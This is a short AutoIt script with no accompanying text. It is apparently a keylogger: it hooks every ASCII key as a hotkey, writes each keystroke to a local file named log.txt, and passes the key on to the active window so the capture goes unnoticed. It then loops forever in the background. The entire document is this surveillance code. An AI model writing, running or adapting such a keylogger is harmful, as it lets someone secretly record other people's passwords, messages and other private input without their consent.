
Local $key_array[128]
Local $i = 0
Local $char = ''

for $i=0 to 127 Step 1
   $char = Chr($i)
   ;MsgBox(0,'Message',@HotKeyPressed)
   HotKeySet($char,"PressedKey")
Next
   ConsoleWrite("")

Func PressedKey()
   FileWrite("log.txt",@HotKeyPressed)
   ControlSend("","","",@HotKeyPressed)
EndFunc


While 1
   Sleep(100)
WEnd